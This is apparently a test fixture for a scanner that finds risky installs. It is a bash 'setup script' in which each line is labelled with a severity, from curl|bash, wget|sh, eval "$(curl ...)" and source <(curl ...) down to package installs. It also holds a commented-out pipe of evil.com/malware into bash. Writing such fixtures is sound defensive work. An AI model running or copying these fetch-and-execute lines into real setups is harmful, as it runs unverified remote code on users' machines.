#!/bin/bash
# Setup script for the project

set -euo pipefail

# SHADOW: curl | bash (CRITICAL)
curl -fsSL https://get.docker.com | bash

# SHADOW: wget | sh (CRITICAL)
wget -qO- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh | sh

# SHADOW: bash <(curl ...) process substitution (CRITICAL)
bash <(curl -s https://install.example.com/setup.sh)

# SHADOW: eval "$(curl ...)" (CRITICAL)
eval "$(curl -fsSL https://raw.githubusercontent.com/rbenv/rbenv-installer/HEAD/bin/rbenv-installer)"

# SHADOW: source <(curl ...) (CRITICAL)
source <(curl -fsSL https://setup.example.com/env.sh)

# SHADOW: direct binary download (HIGH)
curl -Lo /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.28.0/bin/linux/amd64/kubectl"
chmod +x /usr/local/bin/kubectl

# SHADOW: GitHub releases download (HIGH)
curl -fsSL -o /tmp/terraform.zip https://github.com/hashicorp/terraform/releases/download/v1.5.0/terraform_1.5.0_linux_amd64.zip

# SHADOW: go install (MEDIUM)
go install github.com/mikefarah/yq/v4@latest

# SHADOW: cargo install (MEDIUM)
cargo install ripgrep

# SHADOW: git clone (MEDIUM)
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git

# SHADOW: brew install (LOW)
brew install jq

# SHADOW: apt-get install (LOW)
apt-get install -y unzip wget

# SAFE: this is a comment, should not be flagged
# curl -fsSL https://evil.com/malware | bash

# SAFE: local script execution (not a remote URL)
./local-setup.sh
